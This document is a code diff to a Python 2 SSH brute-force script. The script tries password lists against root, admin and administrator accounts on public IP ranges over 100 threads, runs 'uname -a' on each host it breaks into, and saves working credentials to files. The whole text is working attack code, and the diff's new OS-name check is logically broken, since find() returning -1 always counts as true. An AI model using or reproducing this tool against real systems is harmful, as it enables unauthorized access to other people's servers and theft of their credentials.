@@ -134,7 +134,7 @@ def login_test(ip):
 def libssh2_login(ip):
     print "ip:", ip
     #probe_ips=find_target(ip_range)
-    passwords = get_passwords("password.100")
+#    passwords = get_passwords("password.100")
     passwords = get_passwords("global.password")
 #    passwords = ['root', 'nsfocus']
     users = ['root', 'admin', 'administrator']
@@ -158,9 +158,16 @@ def libssh2_login(ip):
                 my_print(session.last_error())
                 channel = session.open_session()
                 rc = channel.execute('uname -a')
+                result = ''
+                while True:
+                    data = channel.read()
+                    if not data:
+                        break
+                    result = result + data
                 my_print(rc)
             #    channel.close()
-                if not rc:
+                if not rc and (result.lower().find('aix') or result.lower().find('linux') \
+                        or result.lower().find('hp-ux') or result.lower().find('solaris')):
                     print "ok---------------------------------------"
                     with open("login.ok" + ip, 'w') as fd:
                         fd.write('login %s ok with user:%s password:%s' %(ip, user, password))
@@ -197,7 +204,7 @@ class MyThread(threading.Thread):
 
 if __name__ == "__main__":
     #print "start..............."
-    ips = find_target("218.144.*.*")
+#    ips = find_target("218.144.*.*")
 #    libssh2_login('63.149.230.225')
 #    libssh2_login('10.20.60.18')
 #    import sys
@@ -209,6 +216,7 @@ if __name__ == "__main__":
 #    ips = find_target("10.20.60.*")
 #    print "".join(ips)
     #ips=['10.16.105.2']
+    ips = open('218_144.txt', 'r').readlines()
     threadlist = []
     thread_number = 100
     global mutex
